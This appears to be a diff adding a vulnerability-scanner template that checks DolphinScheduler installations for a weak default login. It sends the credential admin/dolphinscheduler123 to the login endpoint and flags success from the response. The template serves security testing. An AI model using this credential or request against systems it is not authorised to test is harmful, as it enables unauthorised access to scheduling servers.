@@ -1,0 +1,21 @@
+id: poc-yaml-dolphinscheduler-weak-pass
+info:
+  name: DolphinScheduler 弱口令漏洞
+  severity: high
+  tags:
+  - 弱口令
+  finger: DolphinScheduler
+  osprey-id: vb_2022_0114
+variables:
+  r_username: admin
+  r_password: dolphinscheduler123
+requests:
+- method: POST
+  path: /dolphinscheduler/login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: userName={{.r_username}}&userPassword={{.r_password}}
+  expression: 'contains(body, "\"msg\":\"login success\"") ||  contains(body, "\"msg\":\"登录成功\",\"data\":{\"sessionId\"")
+
+    '
+transport: http
